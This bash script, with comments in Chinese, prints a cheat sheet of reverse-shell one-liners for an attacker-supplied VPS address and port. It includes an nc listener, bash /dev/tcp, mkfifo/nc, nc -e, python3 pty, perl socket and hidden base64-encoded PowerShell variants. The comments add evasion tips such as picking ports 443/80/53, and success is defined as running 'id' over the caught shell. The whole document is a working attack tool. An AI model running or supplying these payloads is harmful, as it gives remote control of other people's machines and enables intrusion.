#!/usr/bin/env bash
VPS="${1:?usage: bash shell.sh <VPS> [port]}"
PORT="${2:-9001}"
cat <<EOF
# 先在自己的 VPS 起监听（端口优先选 443/80/53）
nc -lvnp $PORT

# Linux / bash（最常见）
bash -i >& /dev/tcp/$VPS/$PORT 0>&1
bash -c 'bash -i >& /dev/tcp/$VPS/$PORT 0>&1'

# 没有 /dev/tcp（sh/dash）
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc $VPS $PORT > /tmp/f

# nc 版本（-e 支持时）
nc -e /bin/sh $VPS $PORT

# python3（最稳，pty 直接有作业控制）
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("$VPS",$PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("sh")'

# perl
perl -e 'use Socket;$i="$VPS";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");'

# Windows / powershell（base64 编码整条命令绕过引号问题）
# $c='...'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))
powershell -nop -w hidden -enc <base64>

# 判定：VPS 上出现连接并能执行 id
EOF
